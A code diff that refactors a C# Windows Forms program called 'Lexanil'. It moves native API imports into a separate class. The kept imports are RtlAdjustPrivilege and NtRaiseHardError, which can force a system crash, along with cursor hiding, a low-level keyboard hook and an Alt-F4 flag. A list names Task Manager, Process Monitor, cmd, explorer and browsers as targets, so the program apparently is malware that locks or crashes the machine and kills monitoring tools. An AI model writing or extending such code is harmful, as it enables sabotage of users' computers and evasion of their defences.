@@ -1,35 +1,57 @@
 ﻿using System;
 using System.Collections.Generic;
-using System.ComponentModel;
-using System.Data;
-using System.Drawing;
 using System.Linq;
-using System.Text;
-using System.Threading.Tasks;
 using System.Windows.Forms;
 using System.Diagnostics;
 using System.Net;
-using Lexanil;
 using System.IO;
 using System.Text.RegularExpressions;
 using System.Runtime.InteropServices;
-using System.Threading;
 using System.Net.Sockets;
 using Microsoft.Win32;
-using System.Collections.Specialized;
+
+using static Lexanil.NativeMethods;
 
 namespace Lexanil
 {
-    public partial class Form1 : Form
+    public static class NativeMethods
     {
-        [DllImport("ntdll.dll")]
+        public delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
+
+        #region Kernel32
+        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        public static extern IntPtr GetModuleHandle(string name);
+        #endregion
+
+        #region Ntdll
+        [DllImport("ntdll.dll", CharSet = CharSet.Auto, SetLastError = true)]
         public static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);
 
-        [DllImport("ntdll.dll")]
+        [DllImport("ntdll.dll", CharSet = CharSet.Auto, SetLastError = true)]
         public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);
+        #endregion
 
-        [DllImport("user32.dll")]
-        static extern int ShowCursor(bool bShow);
+        #region User32
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        public static extern int ShowCursor(bool bShow);
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        public static extern IntPtr SetWindowsHookEx(int id, LowLevelKeyboardProc callback, IntPtr hMod, uint dwThreadId);
+        
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        public static extern bool UnhookWindowsHookEx(IntPtr hook);
+        
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        public static extern IntPtr CallNextHookEx(IntPtr hook, int nCode, IntPtr wp, IntPtr lp);
+        
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        public static extern short GetAsyncKeyState(Keys key);
+        #endregion
+    }
+
+    public partial class Form1 : Form
+    {
+
         private bool ALT_F4 = false;
 
         [StructLayout(LayoutKind.Sequential)]
@@ -41,20 +63,6 @@ namespace Lexanil
             public int time;
             public IntPtr extra;
         }
-        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
-        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-        private static extern IntPtr SetWindowsHookEx(int id, LowLevelKeyboardProc callback, IntPtr hMod, uint dwThreadId);
-        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-        private static extern bool UnhookWindowsHookEx(IntPtr hook);
-        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-        private static extern IntPtr CallNextHookEx(IntPtr hook, int nCode, IntPtr wp, IntPtr lp);
-        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-        private static extern IntPtr GetModuleHandle(string name);
-        [DllImport("user32.dll", CharSet = CharSet.Auto)]
-
-
-
-        private static extern short GetAsyncKeyState(Keys key); 
         private IntPtr ptrHook;
         private LowLevelKeyboardProc objKeyboardProcess;
         static string[] processes = new[] { "iexplore", "steam", "explorer", "Taskmgr", "Procmon", "Procmon64", "cmd", "Discord", "chrome", "firefox" };
@@ -258,7 +266,5 @@ namespace Lexanil
 
         }
     }
-
-
 }
 
